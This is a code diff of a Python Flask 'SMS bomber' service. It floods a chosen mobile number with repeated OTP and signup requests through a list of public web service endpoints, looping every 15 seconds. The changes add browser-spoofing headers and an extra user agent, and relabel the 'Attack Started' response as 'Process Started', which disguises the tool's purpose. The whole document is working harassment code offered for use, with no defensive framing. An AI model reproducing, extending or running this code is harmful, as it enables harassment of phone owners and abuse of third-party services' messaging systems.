@@ -10,6 +10,7 @@ active_tasks = {}
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36"
 ]
 
@@ -18,13 +19,17 @@ def send_bomber(mobile):
     session = requests.Session()
     
     while active_tasks.get(mobile):
-        headers = {"User-Agent": random.choice(USER_AGENTS)}
-        print(f"\n--- Round {count} for {mobile} ---")
+        headers = {
+            "User-Agent": random.choice(USER_AGENTS),
+            "Accept": "application/json",
+            "Referer": "https://www.google.com/"
+        }
         
-        # Sabhi 22 APIs ka sahi format
+        print(f"\n--- Round {count} Started for {mobile} ---")
+        
         apis = [
-            {"name": "ConfirmTkt", "m": "POST", "u": "https://securedapi.confirmtkt.com/api/platform/register", "d": {"mobileNumber": mobile}, "t": "json"},
             {"name": "JustDial", "m": "GET", "u": f"https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={mobile}"},
+            {"name": "ConfirmTkt", "m": "POST", "u": "https://securedapi.confirmtkt.com/api/platform/register", "d": {"mobileNumber": mobile}, "t": "json"},
             {"name": "AllenSolly", "m": "POST", "u": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail", "d": {"mobileoremail": mobile}, "t": "data"},
             {"name": "Frotels", "m": "POST", "u": "https://www.frotels.com/appsendsms.php", "d": {"mobno": mobile}, "t": "data"},
             {"name": "Gapoon", "m": "POST", "u": "https://www.gapoon.com/userSignup", "d": {"mobile": mobile}, "t": "data"},
@@ -59,7 +64,7 @@ def send_bomber(mobile):
                         res = session.post(api["u"], data=api["d"], headers=headers, timeout=5)
                 print(f"[{api['name']}] Status: {res.status_code}")
             except:
-                print(f"[{api['name']}] Failed")
+                print(f"[{api['name']}] Error")
 
         count += 1
         time.sleep(15)
@@ -75,7 +80,7 @@ def start_bomber():
         return jsonify({"status": "error", "message": "Invalid Number"})
     active_tasks[mobile] = True
     threading.Thread(target=send_bomber, args=(mobile,)).start()
-    return jsonify({"status": "success", "message": "Attack Started"})
+    return jsonify({"status": "success", "message": "Process Started"})
 
 @app.route('/stop', methods=['POST'])
 def stop_bomber():
